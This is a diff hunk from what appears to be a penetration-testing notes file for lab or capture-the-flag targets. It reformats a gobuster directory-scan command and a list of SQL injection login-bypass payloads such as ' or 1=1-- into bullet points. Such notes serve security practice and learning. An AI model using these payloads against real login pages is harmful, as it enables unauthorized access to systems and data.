@@ -29,15 +29,15 @@ While nmap is running the above, open all IPs in browser to see if any web servi
 gobuster -e -u 'http://10.10.10.10' -w /usr/share/wordlists/<path_to_wordlist_file>.txt
 
 Any login page found, try SQLi manually:
-admin' --
-admin' #
-admin' /*
-' or 1=1--
-1' or '1'='1'-- -
-' or 1=1#
-' or 1=1/*
-') or '1'='1--
-') or ('1'='1-
+- admin' --
+- admin' #
+- admin' /*
+- ' or 1=1--
+- 1' or '1'='1'-- -
+- ' or 1=1#
+- ' or 1=1/*
+- ') or '1'='1--
+- ') or ('1'='1-
 
 
 
